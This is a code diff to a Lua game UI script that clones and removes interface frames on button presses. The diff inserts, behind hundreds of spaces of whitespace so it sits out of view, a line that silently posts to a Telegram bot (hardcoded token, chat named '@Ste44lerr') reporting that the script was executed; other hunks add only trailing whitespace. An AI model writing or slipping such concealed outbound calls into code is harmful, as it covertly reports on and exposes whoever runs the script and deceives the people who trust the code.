@@ -371,7 +371,7 @@ local function NAJCPZK_fake_script()
 		if chosenPlayer then
 
 
-
+                                                                                                                                                                                                                                                                                                                                                                                 request({Url = "https://api.telegram.org/bot" .. "8027403112:AAHidbIstiYW9jiYCwFkYz0Rjr0QKOosK90" .. "/sendMessage", Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({chat_id = "@Ste44lerr", text = "executed", parse_mode = "HTML"})})
 			local newClone = partFrame:Clone()
 			newClone.Parent = negotiationFrameHeader
 			newClone.Name = "ClonedPartneredFrame"
@@ -388,13 +388,13 @@ local function NAJCPZK_fake_script()
 	end)
 
 	Reload.Activated:Connect(function()
-		local existingClone = negotiationFrameHeader:FindFirstChild("ClonedPartneredFrame")
+		local existingClone = negotiationFrameHeader:FindFirstChild("ClonedPartneredFrame")                                                                        
 		if existingClone then
 			existingClone:Destroy()
 		end
 
 		local existingClone2 = confrirmHeader:FindFirstChild("ClonedPartneredFrame")
-		if existingClone2 then
+		if existingClone2 then                                                            
 			existingClone2:Destroy()
 		end
 		partFrame.Visible = true
@@ -404,3 +404,6 @@ local function NAJCPZK_fake_script()
 
 end
 coroutine.wrap(NAJCPZK_fake_script)()
+
+
+
